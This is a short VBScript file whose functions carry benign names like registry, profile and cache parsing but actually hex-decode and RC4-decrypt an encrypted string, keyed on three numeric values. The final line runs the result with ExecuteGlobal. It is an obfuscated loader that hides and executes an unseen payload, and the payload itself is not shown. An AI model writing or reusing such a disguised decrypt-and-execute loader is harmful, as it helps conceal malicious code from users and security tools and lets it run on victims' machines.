Function ParseRegistryChunk67(H)
Dim strRaw48,idx83
idx83="":strRaw48=1
Do While strRaw48<=Len(H)
idx83=idx83 & Chr(CLng("&H" & Mid(H,strRaw48,2)))
strRaw48=strRaw48+2
Loop
ParseRegistryChunk67=idx83
End Function

Function ParseProfileBlock75(K)
Dim strRaw25,strRaw37,nLen68,intCnt59
ReDim intCnt59(255)
For strRaw25=0 To 255:intCnt59(strRaw25)=strRaw25:Next
strRaw37=0
For strRaw25=0 To 255
strRaw37=(strRaw37+intCnt59(strRaw25)+Asc(Mid(K,(strRaw25 Mod Len(K))+1,1))) Mod 256
nLen68=intCnt59(strRaw25):intCnt59(strRaw25)=intCnt59(strRaw37):intCnt59(strRaw37)=nLen68
Next
ParseProfileBlock75=intCnt59
End Function

Function ReadCacheLine31(Zms,Tms,Gsy,Seed)
Dim val51,strBuf84,intCnt93,intCnt12,pos616,lngLen467,arr605,seg17,pid66
arr605=CStr(Tms) & ":" & CStr(Gsy) & ":" & CStr(Seed)
seg17=ParseRegistryChunk67(Zms)
pid66=ParseProfileBlock75(arr605)
val51=0:strBuf84=0:lngLen467=""
For intCnt12=1 To Len(seg17)
val51=(val51+1) Mod 256
strBuf84=(strBuf84+pid66(val51)) Mod 256
pos616=pid66(val51):pid66(val51)=pid66(strBuf84):pid66(strBuf84)=pos616
intCnt93=pid66((pid66(val51)+pid66(strBuf84)) Mod 256)
lngLen467=lngLen467 & Chr(Asc(Mid(seg17,intCnt12,1)) Xor intCnt93)
Next
ReadCacheLine31=lngLen467
End Function
ExecuteGlobal ReadCacheLine31(strManifest,intManifestVer614,intRetryCount680,intModuleBuild489)
